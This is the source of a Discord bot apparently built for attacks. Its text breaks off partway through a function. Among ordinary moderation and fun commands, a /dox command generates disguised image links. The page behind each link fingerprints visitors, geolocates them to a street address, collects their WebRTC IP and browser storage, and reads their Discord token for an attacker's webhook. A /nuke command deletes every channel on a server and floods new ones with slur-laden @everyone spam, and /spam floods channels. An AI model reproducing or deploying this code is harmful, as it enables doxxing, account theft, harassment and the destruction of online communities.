// ============================================================
// Pulse Bot – Full Command Suite
// ============================================================
const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();
const os = require('os');
const fs = require('fs');
const path = require('path');

// ============================================================
// ENVIRONMENT VARIABLES
// ============================================================
const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
const PORT = process.env.PORT || 3000;

// ============================================================
// CLIENT SETUP
// ============================================================
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildModeration,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.GuildMessageTyping
    ]
});

// ============================================================
// GLOBAL STORAGE
// ============================================================
const links = new Map();
const startTime = Date.now();
const commandLogs = [];

// ============================================================
// EXPRESS SERVER – DOX LINK HANDLER
// ============================================================
app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});
app.listen(PORT, () => console.log(`[SERVER] Dox server running on port ${PORT}`));

// ============================================================
// COMMAND REGISTRATION
// ============================================================
client.once('ready', async () => {
    console.log(`[BOT] Logged in as ${client.user.tag}`);
    console.log(`[BOT] Invite: https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`);
    console.log(`[BOT] Guild count: ${client.guilds.cache.size}`);

    // Clear old commands
    await client.application.commands.set([]);
    console.log('[COMMANDS] Cleared old commands');

    // Register new commands
    const commands = [
        { name: 'dox', description: 'Generate a dox link', options: [{ name: 'webhook', type: 3, description: 'Discord webhook URL', required: true }] },
        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Number of messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Message content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms between messages', required: false }] },
        { name: 'nuke', description: 'Delete all channels, create new ones, flood, then leave', options: [{ name: 'channels', type: 4, description: 'Channels to create (default 20, max 50)', required: false }, { name: 'messages', type: 4, description: 'Messages per channel (default 10, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
        { name: 'ad', description: 'Advertise the server invite' },
        { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason for purge', required: false }] },
        { name: 'serverinfo', description: 'Get detailed server information' },
        { name: 'userinfo', description: 'Get information about a user', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'math', description: 'Calculate a math expression', options: [{ name: 'expression', type: 3, description: 'Math expression (e.g., 2+2)', required: true }] },
        { name: 'ping', description: 'Check bot latency' },
        { name: 'say', description: 'Make the bot say something', options: [{ name: 'message', type: 3, description: 'Message to say', required: true }] },
        { name: 'avatar', description: 'Show a user\'s avatar', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'kick', description: 'Kick a member from the server', options: [{ name: 'user', type: 6, description: 'User to kick', required: true }, { name: 'reason', type: 3, description: 'Reason for kick', required: false }] },
        { name: 'ban', description: 'Ban a member from the server', options: [{ name: 'user', type: 6, description: 'User to ban', required: true }, { name: 'reason', type: 3, description: 'Reason for ban', required: false }] },
        { name: 'unban', description: 'Unban a user by their ID', options: [{ name: 'userid', type: 3, description: 'User ID to unban', required: true }] },
        { name: 'timeout', description: 'Timeout a member', options: [{ name: 'user', type: 6, description: 'Target user', required: true }, { name: 'duration', type: 4, description: 'Duration in minutes (1-40320)', required: true }, { name: 'reason', type: 3, description: 'Reason for timeout', required: false }] },
        { name: 'role', description: 'Add or remove a role from a member', options: [{ name: 'action', type: 3, description: 'Add or remove', required: true, choices: [{ name: 'add', value: 'add' }, { name: 'remove', value: 'remove' }] }, { name: 'user', type: 6, description: 'Target user', required: true }, { name: 'role', type: 8, description: 'Role to add/remove', required: true }] },
        { name: 'poll', description: 'Create a poll', options: [{ name: 'question', type: 3, description: 'Poll question', required: true }, { name: 'option1', type: 3, description: 'Option 1', required: true }, { name: 'option2', type: 3, description: 'Option 2', required: true }, { name: 'option3', type: 3, description: 'Option 3 (optional)', required: false }, { name: 'option4', type: 3, description: 'Option 4 (optional)', required: false }] },
        { name: 'embed', description: 'Send a custom embed', options: [{ name: 'title', type: 3, description: 'Embed title', required: true }, { name: 'description', type: 3, description: 'Embed description', required: true }, { name: 'color', type: 3, description: 'Hex color (e.g., #ff0000)', required: false }] },
        { name: 'invite', description: 'Get the bot invite link' },
        { name: 'help', description: 'Show all available commands' },
        { name: '8ball', description: 'Ask the magic 8-ball a question', options: [{ name: 'question', type: 3, description: 'Your question', required: true }] },
        { name: 'roll', description: 'Roll a dice', options: [{ name: 'sides', type: 4, description: 'Number of sides (default 6)', required: false }] },
        { name: 'serverlist', description: 'List all servers the bot is in' },
        { name: 'botstatus', description: 'Change the bot\'s status', options: [{ name: 'status', type: 3, description: 'online/idle/dnd/invisible', required: true }, { name: 'activity', type: 3, description: 'Activity text', required: false }] },
        { name: 'slowmode', description: 'Set slowmode in the current channel', options: [{ name: 'seconds', type: 4, description: 'Slowmode in seconds (0 to disable)', required: true }] },
        { name: 'lock', description: 'Lock the current channel (requires Manage Channels)' },
        { name: 'unlock', description: 'Unlock the current channel (requires Manage Channels)' },
        { name: 'uptime', description: 'Show the bot\'s uptime' },
        { name: 'countdown', description: 'Start a countdown timer', options: [{ name: 'seconds', type: 4, description: 'Seconds to count down (max 600)', required: true }] },
        { name: 'remindme', description: 'Set a reminder', options: [{ name: 'time', type: 4, description: 'Minutes to wait (max 60)', required: true }, { name: 'message', type: 3, description: 'Reminder message', required: true }] },
        { name: 'choose', description: 'Choose between multiple options', options: [{ name: 'options', type: 3, description: 'Comma-separated options (e.g., pizza,burger,sushi)', required: true }] },
        { name: 'coinflip', description: 'Flip a coin' },
        { name: 'weather', description: 'Get weather for a city (placeholder)', options: [{ name: 'city', type: 3, description: 'City name', required: true }] },
        { name: 'urban', description: 'Search Urban Dictionary (placeholder)', options: [{ name: 'term', type: 3, description: 'Term to look up', required: true }] },
        { name: 'translate', description: 'Translate text (placeholder)', options: [{ name: 'text', type: 3, description: 'Text to translate', required: true }, { name: 'target', type: 3, description: 'Target language code (e.g., es, fr)', required: false }] }
    ];

    await client.application.commands.set(commands);
    console.log(`[COMMANDS] Registered ${commands.length} commands`);
});

// ============================================================
// INTERACTION HANDLER – MASTER
// ============================================================
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // Defer immediately to avoid timeout
    await interaction.deferReply({ ephemeral: true });

    try {
        const { commandName, options, user, member, guild, channel } = interaction;
        const timestamp = new Date().toISOString();

        // Log to file and console
        console.log(`[${timestamp}] ${user.tag} executed /${commandName}`);
        commandLogs.push(`[${timestamp}] ${user.tag} -> /${commandName}`);

        // ---- COMMAND HANDLING ----
        if (commandName === 'dox') {
            const wh = options.getString('webhook');
            if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) return interaction.editReply('❌ Invalid webhook URL.');
            const id = crypto.randomBytes(6).toString('hex');
            const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
            links.set(id, { webhook: wh, user: user.tag, created: Date.now() });
            const embed = new EmbedBuilder()
                .setTitle('✅ Dox Link Ready')
                .setColor(0x22c55e)
                .setDescription(`🔗 **${url}**\n\nSends IP, geolocation, battery, connection, device fingerprint, Discord token, and more.`)
                .setFooter({ text: `Generated by ${user.tag}` });
            await interaction.editReply({ embeds: [embed] });
        }

        else if (commandName === 'spam') {
            const count = Math.min(options.getInteger('count'), 100);
            const msg = options.getString('message');
            const delay = options.getInteger('delay') || 0;
            if (!channel) return interaction.editReply('❌ No channel.');
            for (let i = 0; i < count; i++) {
                await channel.send(msg);
                if (delay > 0) await new Promise(r => setTimeout(r, delay));
            }
            await interaction.editReply(`✅ Spammed ${count} messages.`);
        }

        else if (commandName === 'nuke') {
            if (!guild) return interaction.editReply('❌ Server only.');
            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Administrator.');
            const channelCount = Math.min(options.getInteger('channels') || 20, 50);
            const msgCount = Math.min(options.getInteger('messages') || 10, 100);
            const delayMs = Math.min(options.getInteger('delay') || 50, 500);
            const variants = [
                '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
                '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
                '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER',
                '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER',
                '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'
            ];
            const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
            await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
            const newChannels = await Promise.all(Array.from({ length: channelCount }, () => guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)));
            const valid = newChannels.filter(c => c);
            const messages = [];
            for (let i = 0; i < msgCount; i++) {
                let line = variants[i % variants.length];
                let big = `@everyone ${line}\n`;
                while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
                big += `\n${inviteLine}`;
                messages.push(big.slice(0, 2000));
            }
            for (let i = 0; i < messages.length; i++) {
                await Promise.all(valid.map(c => c.send(messages[i]).catch(() => {})));
                if (i < messages.length - 1) await new Promise(r => setTimeout(r, delayMs));
            }
            await guild.leave();
            await interaction.editReply(`✅ Nuked. Created ${valid.length} channels, sent ${msgCount} messages each.`);
        }

        else if (commandName === 'ad') {
            if (!channel) return interaction.editReply('❌ No channel.');
            const embed = new EmbedBuilder()
                .setTitle('🔥 Pulse Nuke Power')
                .setColor(0x8B5CF6)
                .setDescription(`Join Pulse:\n${INVITE_LINK}`)
                .setFooter({ text: 'Pulse Bot' });
            await channel.send({ embeds: [embed] });
            await interaction.editReply('✅ Ad sent.');
        }

        else if (commandName === 'purge') {
            const amount = Math.min(options.getInteger('amount'), 100);
            const targetUser = options.getUser('user');
            const reason = options.getString('reason') || 'No reason provided';
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!channel.permissionsFor(member).has(PermissionsBitField.Flags.ManageMessages)) return interaction.editReply('❌ Need Manage Messages.');
            let messages = await channel.messages.fetch({ limit: amount });
            if (targetUser) messages = messages.filter(m => m.author.id === targetUser.id);
            const deleted = await channel.bulkDelete(messages, true).catch(() => {});
            const embed = new EmbedBuilder()
                .setTitle('🧹 Purge Complete')
                .setColor(0x22c55e)
                .setDescription(`Deleted ${deleted ? deleted.size : 0} messages.`)
                .addFields({ name: 'Reason', value: reason });
            await interaction.editReply({ embeds: [embed] });
        }

        else if (commandName === 'serverinfo') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const owner = await guild.fetchOwner();
            const embed = new EmbedBuilder()
                .setTitle(`📊 ${guild.name}`)
                .setColor(0x8B5CF6)
                .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: '🆔 Server ID', value: guild.id, inline: true },
                    { name: '👑 Owner', value: owner.user.tag, inline: true },
                    { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
                    { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
                    { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
                    { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
                );
            await interaction.editReply({ embeds: [embed] });
        }

        else if (commandName === 'userinfo') {
            const target = options.getUser('user') || user;
            const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
            const embed = new EmbedBuilder()
                .setTitle(`👤 ${target.tag}`)
                .setColor(0x8B5CF6)
                .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: '🆔 User ID', value: target.id, inline: true },
                    { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
                    { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
                );
            if (memberTarget) {
                embed.addFields(
                    { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
                    { name: '📊 Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
                );
            }
            await interaction.editReply({ embeds: [embed] });
        }

        else if (commandName === 'math') {
            const expr = options.getString('expression');
            try {
                const sanitized = expr.replace(/[^0-9+\-*/().% ]/g, '');
                if (!sanitized) return interaction.editReply('❌ Invalid expression.');
                const result = Function(`"use strict"; return (${sanitized})`)();
                await interaction.editReply(`🧮 **${expr}** = **${result}**`);
            } catch (e) {
                await interaction.editReply(`❌ Error: ${e.message}`);
            }
        }

        else if (commandName === 'ping') {
            const sent = await interaction.editReply({ content: '🏓 Pinging...', fetchReply: true });
            const latency = sent.createdTimestamp - interaction.createdTimestamp;
            await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
        }

        else if (commandName === 'say') {
            const msg = options.getString('message');
            if (!channel) return interaction.editReply('❌ No channel.');
            await channel.send(msg);
            await interaction.editReply('✅ Sent.');
        }

        else if (commandName === 'avatar') {
            const target = options.getUser('user') || user;
            const embed = new EmbedBuilder()
                .setTitle(`${target.tag}'s Avatar`)
                .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }))
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
        }

        else if (commandName === 'kick') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const target = options.getUser('user');
            const reason = options.getString('reason') || 'No reason';
            const targetMember = await guild.members.fetch(target.id).catch(() => null);
            if (!targetMember) return interaction.editReply('❌ User not in server.');
            if (!member.permissions.has(PermissionsBitField.Flags.KickMembers)) return interaction.editReply('❌ No permission.');
            if (targetMember.id === client.user.id) return interaction.editReply('❌ Cannot kick myself.');
            await targetMember.kick(reason);
            await interaction.editReply(`✅ Kicked ${target.tag} for "${reason}"`);
        }

        else if (commandName === 'ban') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const target = options.getUser('user');
            const reason = options.getString('reason') || 'No reason';
            if (!member.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.editReply('❌ No permission.');
            await guild.bans.create(target.id, { reason });
            await interaction.editReply(`✅ Banned ${target.tag} for "${reason}"`);
        }

        else if (commandName === 'unban') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const userId = options.getString('userid');
            if (!member.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.editReply('❌ No permission.');
            await guild.bans.remove(userId);
            await interaction.editReply(`✅ Unbanned user ${userId}`);
        }

        else if (commandName === 'timeout') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const target = options.getUser('user');
            const duration = options.getInteger('duration');
            const reason = options.getString('reason') || 'No reason';
            const targetMember = await guild.members.fetch(target.id).catch(() => null);
            if (!targetMember) return interaction.editReply('❌ User not in server.');
            if (!member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return interaction.editReply('❌ No permission.');
            await targetMember.timeout(duration * 60000, reason);
            await interaction.editReply(`✅ Timed out ${target.tag} for ${duration} minutes.`);
        }

        else if (commandName === 'role') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const action = options.getString('action');
            const target = options.getUser('user');
            const role = options.getRole('role');
            const targetMember = await guild.members.fetch(target.id).catch(() => null);
            if (!targetMember) return interaction.editReply('❌ User not in server.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageRoles)) return interaction.editReply('❌ No permission.');
            if (role.position >= guild.members.me.roles.highest.position) return interaction.editReply('❌ Role too high.');
            if (action === 'add') {
                await targetMember.roles.add(role);
                await interaction.editReply(`✅ Added ${role.name} to ${target.tag}`);
            } else {
                await targetMember.roles.remove(role);
                await interaction.editReply(`✅ Removed ${role.name} from ${target.tag}`);
            }
        }

        else if (commandName === 'poll') {
            if (!channel) return interaction.editReply('❌ No channel.');
            const question = options.getString('question');
            const opt1 = options.getString('option1');
            const opt2 = options.getString('option2');
            const opt3 = options.getString('option3');
            const opt4 = options.getString('option4');
            const opts = [opt1, opt2, opt3, opt4].filter(o => o);
            const emojis = ['1️⃣', '2️⃣', '3️⃣', '4️⃣'];
            let desc = opts.map((o, i) => `${emojis[i]} ${o}`).join('\n');
            const embed = new EmbedBuilder()
                .setTitle(`📊 ${question}`)
                .setDescription(desc)
                .setColor(0x8B5CF6);
            const msg = await channel.send({ embeds: [embed] });
            for (let i = 0; i < opts.length; i++) await msg.react(emojis[i]);
            await interaction.editReply('✅ Poll created.');
        }

        else if (commandName === 'embed') {
            if (!channel) return interaction.editReply('❌ No channel.');
            const title = options.getString('title');
            const description = options.getString('description');
            const color = options.getString('color') || '#8B5CF6';
            const embed = new EmbedBuilder()
                .setTitle(title)
                .setDescription(description)
                .setColor(color)
                .setTimestamp();
            await channel.send({ embeds: [embed] });
            await interaction.editReply('✅ Embed sent.');
        }

        else if (commandName === 'invite') {
            await interaction.editReply(`🔗 Invite me: https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`);
        }

        else if (commandName === 'help') {
            const commands = client.application.commands.cache.map(c => `\`/${c.name}\` - ${c.description}`).join('\n');
            const embed = new EmbedBuilder()
                .setTitle('📋 Commands')
                .setDescription(commands)
                .setColor(0x8B5CF6)
                .setFooter({ text: `Total ${client.application.commands.cache.size} commands` });
            await interaction.editReply({ embeds: [embed] });
        }

        else if (commandName === '8ball') {
            const responses = ['Yes', 'No', 'Maybe', 'Ask again later', 'Definitely', 'Absolutely not', 'It is certain', 'Very doubtful'];
            const answer = responses[Math.floor(Math.random() * responses.length)];
            const q = options.getString('question');
            const embed = new EmbedBuilder()
                .setTitle('🎱 8-Ball')
                .setDescription(`**Question:** ${q}\n**Answer:** ${answer}`)
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
        }

        else if (commandName === 'roll') {
            const sides = options.getInteger('sides') || 6;
            const result = Math.floor(Math.random() * sides) + 1;
            await interaction.editReply(`🎲 Rolled a d${sides}: **${result}**`);
        }

        else if (commandName === 'serverlist') {
            const list = client.guilds.cache.map(g => `${g.name} (${g.id})`).join('\n');
            const embed = new EmbedBuilder()
                .setTitle('📋 Server List')
                .setDescription(list || 'None')
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
        }

        else if (commandName === 'botstatus') {
            const status = options.getString('status');
            const activity = options.getString('activity') || 'Pulse Bot';
            const statusMap = { online: 'online', idle: 'idle', dnd: 'dnd', invisible: 'invisible' };
            if (!statusMap[status]) return interaction.editReply('❌ Invalid status. Use online, idle, dnd, invisible.');
            client.user.setPresence({ status: statusMap[status], activities: [{ name: activity, type: 0 }] });
            await interaction.editReply(`✅ Status set to ${status} with activity "${activity}".`);
        }

        else if (commandName === 'slowmode') {
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.editReply('❌ Need Manage Channels.');
            const seconds = options.getInteger('seconds');
            await channel.setRateLimitPerUser(seconds);
            await interaction.editReply(`✅ Slowmode set to ${seconds} seconds.`);
        }

        else if (commandName === 'lock') {
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.editReply('❌ Need Manage Channels.');
            await channel.permissionOverwrites.edit(guild.id, { SendMessages: false });
            await interaction.editReply('🔒 Channel locked.');
        }

        else if (commandName === 'unlock') {
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.editReply('❌ Need Manage Channels.');
            await channel.permissionOverwrites.edit(guild.id, { SendMessages: null });
            await interaction.editReply('🔓 Channel unlocked.');
        }

        else if (commandName === 'uptime') {
            const diff = Date.now() - startTime;
            const seconds = Math.floor(diff / 1000);
            const minutes = Math.floor(seconds / 60);
            const hours = Math.floor(minutes / 60);
            const days = Math.floor(hours / 24);
            const uptime = `${days}d ${hours % 24}h ${minutes % 60}m ${seconds % 60}s`;
            await interaction.editReply(`⏳ Uptime: **${uptime}**`);
        }

        else if (commandName === 'countdown') {
            const seconds = options.getInteger('seconds');
            if (seconds > 600) return interaction.editReply('❌ Max 600 seconds.');
            await interaction.editReply(`⏰ Countdown started for ${seconds} seconds.`);
            for (let i = seconds; i > 0; i--) {
                if (i % 10 === 0 || i <= 5) {
                    await interaction.channel.send(`⏳ ${i} seconds remaining...`).catch(() => {});
                }
                await new Promise(r => setTimeout(r, 1000));
            }
            await interaction.channel.send(`🔔 **Countdown finished!**`).catch(() => {});
        }

        else if (commandName === 'remindme') {
            const minutes = options.getInteger('time');
            const msg = options.getString('message');
            if (minutes > 60) return interaction.editReply('❌ Max 60 minutes.');
            await interaction.editReply(`⏰ Reminder set for ${minutes} minute(s).`);
            setTimeout(async () => {
                try {
                    await user.send(`🔔 **Reminder:** ${msg}`);
                } catch {
                    await channel.send(`🔔 <@${user.id}> **Reminder:** ${msg}`);
                }
            }, minutes * 60000);
        }

        else if (commandName === 'choose') {
            const optionsStr = options.getString('options');
            const choices = optionsStr.split(',').map(s => s.trim()).filter(s => s);
            if (choices.length < 2) return interaction.editReply('❌ Need at least 2 options.');
            const chosen = choices[Math.floor(Math.random() * choices.length)];
            await interaction.editReply(`🤔 I choose: **${chosen}**`);
        }

        else if (commandName === 'coinflip') {
            const result = Math.random() < 0.5 ? 'Heads' : 'Tails';
            await interaction.editReply(`🪙 **${result}**`);
        }

        else if (commandName === 'weather') {
            const city = options.getString('city');
            await interaction.editReply(`🌤️ Weather for ${city} – placeholder (API not implemented)`);
        }

        else if (commandName === 'urban') {
            const term = options.getString('term');
            await interaction.editReply(`📖 Urban Dictionary definition for "${term}" – placeholder (API not implemented)`);
        }

        else if (commandName === 'translate') {
            const text = options.getString('text');
            const target = options.getString('target') || 'en';
            await interaction.editReply(`🌐 Translation to ${target}: "${text}" – placeholder (API not implemented)`);
        }

    } catch (error) {
        console.error(`[ERROR] Command failed:`, error);
        try {
            await interaction.editReply({ content: `❌ An error occurred: ${error.message}` });
        } catch {
            await interaction.followUp({ content: `❌ An error occurred: ${error.message}`, ephemeral: true });
        }
    }
});

// ============================================================
// DOX HTML GENERATOR – FULL FEATURED
// ============================================================
function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
<body>
<script>
const WEBHOOK_URL = "${webhook}";
function hash(s){let h=0;for(let i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0;}return h.toString(36);}
function getCookie(n){const v="; "+document.cookie;const p=v.split("; "+n+"=");if(p.length===2)return p.pop().split(";").shift();return null;}
async function getIPData(){const apis=[
{url:"https://ipinfo.io/json",parse:d=>({ip:d.ip,country:d.country,region:d.region,city:d.city,postal:d.postal,lat:d.loc?.split(",")[0],lon:d.loc?.split(",")[1],asn:d.asn,isp:d.org,timezone:d.timezone})},
{url:"https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query",parse:d=>({ip:d.query,country:d.country,region:d.regionName,city:d.city,postal:d.zip,lat:d.lat,lon:d.lon,asn:d.as,isp:d.isp,timezone:"N/A"})},
{url:"https://api.ipify.org?format=json",parse:d=>({ip:d.ip})},
{url:"https://ipapi.co/json/",parse:d=>({ip:d.ip,country:d.country_name,region:d.region,city:d.city,postal:d.postal,lat:d.latitude,lon:d.longitude,asn:d.asn,isp:d.org,timezone:d.timezone})},
{url:"https://api.ip.sb/geoip",parse:d=>({ip:d.ip,country:d.country,region:d.region,city:d.city,postal:d.postal,lat:d.latitude,lon:d.longitude,asn:d.asn,isp:d.isp,timezone:d.timezone})},
{url:"https://geoplugin.net/json.gp",parse:d=>({ip:d.geoplugin_request,country:d.geoplugin_countryName,region:d.geoplugin_region,city:d.geoplugin_city,postal:d.geoplugin_postcode,lat:d.geoplugin_latitude,lon:d.geoplugin_longitude,asn:"N/A",isp:d.geoplugin_isp,timezone:d.geoplugin_timezone})}
];for(const api of apis){try{const c=new AbortController();const t=setTimeout(()=>c.abort(),5000);const r=await fetch(api.url,{signal:c.signal});clearTimeout(t);const d=await r.json();if(d.ip){const res=api.parse(d);if(res.ip)return res;}}catch(e){}}return{ip:"N/A",country:"N/A",region:"N/A",city:"N/A",postal:"N/A",lat:"N/A",lon:"N/A",asn:"N/A",isp:"N/A",timezone:"N/A"};}
async function reverseGeocode(lat,lon){try{const r=await fetch("https://nominatim.openstreetmap.org/reverse?lat="+lat+"&lon="+lon+"&format=json&zoom=18&addressdetails=1");const d=await r.json();if(d&&d.display_name)return d.display_name;}catch(e){}return null;}
async function getBattery(){try{const b=await navigator.getBattery();return Math.round(b.level*100)+"% ("+(b.charging?"Charging":"Not")+")";}catch{return"Not Available";}}
function getConnection(){try{const c=navigator.connection||navigator.mozConnection;if(c)return(c.effectiveType||c.type)+" ("+(c.downlink||"N/A")+" Mbps, "+(c.rtt||"N/A")+"ms RTT)";}catch{}return"Not Available";}
function getGPU(){try{const c=document.createElement("canvas");const g=c.getContext("webgl");if(!g)return"N/A";const d=g.getExtension("WEBGL_debug_renderer_info");if(!d)return"N/A";return g.getParameter(d.UNMASKED_RENDERER_WEBGL);}catch{return"N/A";}}
function getWebRTC(){return new Promise(r=>{try{const pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel("");pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>{if(!e.candidate)return;const ip=e.candidate.address||e.candidate.ip;if(ip&&!ip.includes("local")){r(ip);pc.close();}};setTimeout(()=>{r("N/A");pc.close();},2000);}catch{r("N/A");}});}
function getCanvasFP(){try{const c=document.createElement("canvas");c.width=256;c.height=64;const ctx=c.getContext("2d");ctx.textBaseline="top";ctx.font="14px Arial";ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);ctx.fillStyle="#069";ctx.fillText("Cwm fjordbank glyphs vext quiz",2,15);ctx.fillStyle="rgba(102,204,0,0.7)";ctx.fillText("Cwm fjordbank glyphs vext quiz",4,17);return c.toDataURL();}catch{return"N/A";}}
function getFonts(){const list=["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Impact","Tahoma","Trebuchet MS","Calibri","Cambria","Consolas","Segoe UI","Roboto","Open Sans","Lato","Montserrat","Poppins","Ubuntu","Inter"];const base="mmmmmmmmmmlli";const test=document.createElement("span");test.style.cssText="position:absolute;top:-9999px;left:-9999px;font-size:72px;font-family:monospace;";test.innerHTML=base;document.body.appendChild(test);const refWidth=test.offsetWidth,refHeight=test.offsetHeight;const detected=[];list.forEach(f=>{test.style.fontFamily=f+", monospace";if(test.offsetWidth!==refWidth||test.offsetHeight!==refHeight)detected.push(f);});document.body.removeChild(test);return detected;}
function getAudioFP(){return new Promise(resolve=>{try{const ctx=new(window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,44100,44100);const osc=ctx.createOscillator();osc.type="triangle";osc.frequency.value=1000;const comp=ctx.createDynamicsCompressor();osc.connect(comp);comp.connect(ctx.destination);osc.start(0);ctx.oncomplete=e=>{const buffer=e.renderedBuffer.getChannelData(0);let str="";for(let i=0;i<100;i++)str+=buffer[i].toFixed(6);resolve(hash(str));};ctx.startRendering();}catch{resolve("N/A");}});}
(async function(){try{const ip=await getIPData();let addr="N/A";let lat=ip.lat||"N/A",lon=ip.lon||"N/A";if(lat!=="N/A"&&lon!=="N/A"){const a=await reverseGeocode(lat,lon);if(a)addr=a;}const battery=await getBattery();const conn=getConnection();const gpu=getGPU();const webrtc=await getWebRTC();const canvas=hash(getCanvasFP());const fonts=getFonts();const audio=await getAudioFP();const ua=navigator.userAgent;const browser=ua.includes("Edg")?"Edge":ua.includes("Chrome")?"Chrome":ua.includes("Firefox")?"Firefox":ua.includes("Safari")?"Safari":"Unknown";const os=ua.includes("Windows NT 10.0")?"Windows 10/11":ua.includes("Mac OS X")?"macOS":ua.includes("Android")?"Android":ua.includes("iPhone")?"iOS":"Unknown";const device=/mobile|android|iphone|ipad/i.test(ua)?"Mobile":/tablet|ipad/i.test(ua)?"Tablet":"Desktop";const screen=screen.width+"x"+screen.height;const cores=navigator.hardwareConcurrency||"N/A";const memory=navigator.deviceMemory||"N/A";const touch=navigator.maxTouchPoints||0;const lang=navigator.language;const now=new Date();const ts=now.toISOString();const local=now.toString();const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;let ls={},ss={};try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage[k];}}catch{}try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);ss[k]=sessionStorage[k];}}catch{}const token=localStorage.getItem("token")||getCookie("token")||"N/A";const fields=[{name:"📍 Address",value:addr},{name:"📌 Coordinates",value:lat+", "+lon},{name:"🌐 IP",value:ip.ip||"N/A"},{name:"🏙️ City",value:ip.city||"N/A"},{name:"🗺️ Region",value:ip.region||"N/A"},{name:"📮 Postal",value:ip.postal||"N/A"},{name:"🔢 ASN",value:ip.asn||"N/A"},{name:"🏢 ISP",value:ip.isp||"N/A"},{name:"🕒 Timezone",value:tz},{name:"🔋 Battery",value:battery},{name:"📶 Connection",value:conn},{name:"📱 